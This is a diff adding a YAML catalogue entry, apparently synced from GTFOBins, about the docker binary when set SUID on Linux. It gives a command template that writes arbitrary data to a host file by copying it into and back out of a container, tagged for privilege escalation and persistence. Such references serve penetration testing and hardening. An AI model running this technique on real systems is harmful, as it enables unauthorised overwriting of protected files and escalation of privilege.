@@ -1,0 +1,30 @@
+id: gtfobins/docker/file-write/suid
+type: binary
+platform: linux
+name: docker
+phases:
+- persistence
+- privilege-escalation
+capabilities:
+- file-write
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'echo DATA >/path/to/temp-file
+
+    docker cp /path/to/temp-file $CONTAINER_ID:temp-file
+
+    docker cp $CONTAINER_ID /path/to/output-file'
+  comment: Write a file by copying it to a temporary container (`$CONTAINER_ID`) and back to the target
+    destination on the host.
+references:
+- https://gtfobins.github.io/gtfobins/docker/
+tags:
+- linux
+- unix
+- gtfobins
